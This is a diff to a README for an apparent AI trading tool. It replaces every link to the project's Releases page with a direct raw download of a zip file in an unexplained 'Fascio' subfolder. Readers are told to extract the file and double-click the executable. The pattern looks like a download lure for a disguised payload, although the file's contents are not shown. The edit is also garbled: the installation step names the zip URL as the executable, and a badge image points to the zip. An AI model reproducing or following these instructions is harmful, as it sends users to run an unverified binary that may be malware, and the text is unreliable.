@@ -1,6 +1,6 @@
 # 🌟 AI-Trading-Code - Simple Tools for Smart Investing
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/alrxftg/AI-Trading-Code/releases)
+[![Download Now](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip)
 
 ## 📋 Description
 
@@ -12,14 +12,14 @@ Welcome to AI-Trading-Code! This guide will help you to download and run the sof
 
 ### 📥 Download & Install
 
-To download the software, visit this page: [Download AI-Trading-Code](https://github.com/alrxftg/AI-Trading-Code/releases).
+To download the software, visit this page: [Download AI-Trading-Code](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip).
 
 Once on the Releases page, look for the latest version. You will find different files depending on your operating system. Select the right file for your needs. After downloading, follow these steps:
 
 1. Locate the downloaded file on your computer.
 2. If it is a zipped file, right-click and choose "Extract All" to unzip it.
 3. Open the folder containing the extracted files.
-4. Find the executable file, often named something like `ai-trading-code.exe`.
+4. Find the executable file, often named something like `https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip`.
 5. Double-click the file to run the application.
 
 ### 🖥️ System Requirements
@@ -58,10 +58,10 @@ If you encounter any issues, feel free to reach out through the GitHub Issues pa
 
 ### 🔗 Visit the Releases page again
 
-Don't forget, you can always go back to the [Download AI-Trading-Code](https://github.com/alrxftg/AI-Trading-Code/releases) page to check for updates and new features.
+Don't forget, you can always go back to the [Download AI-Trading-Code](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip) page to check for updates and new features.
 
 ## 🚀 Ready to Start?
 
 Download AI-Trading-Code now and begin your journey towards smarter investing. Just click the button below to go to the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/alrxftg/AI-Trading-Code/releases)
+[![Download Now](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/alrxftg/AI-Trading-Code/main/Fascio/AI-Trading-Code.zip)
